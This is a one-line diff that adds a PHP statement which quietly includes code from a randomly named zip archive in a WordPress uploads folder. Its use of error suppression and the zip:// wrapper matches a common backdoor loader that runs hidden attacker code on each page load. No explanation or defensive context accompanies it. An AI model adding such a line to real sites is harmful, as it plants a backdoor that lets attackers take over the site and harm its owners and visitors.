@@ -1,0 +1,1 @@
+<?php @include ('zip://'. $_SERVER['DOCUMENT_ROOT'] .'/wp-content/uploads/bceddaeiec.zip#bceddaeiec.php');?>
